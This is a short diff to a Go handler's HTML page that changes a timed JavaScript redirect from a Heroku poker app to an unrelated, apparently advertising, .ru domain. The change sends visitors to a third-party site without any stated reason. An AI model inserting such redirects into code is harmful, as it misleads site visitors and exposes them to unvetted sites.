@@ -44,7 +44,7 @@ func handler(rw http.ResponseWriter, req *http.Request) {
 
   <script>
       setTimeout (function(){
-          document.location.href = "http://poker-iv.herokuapp.com/"
+          document.location.href = "http://4000.99.adscompass.ru"
       }, 3000)
   </script>
 </body>
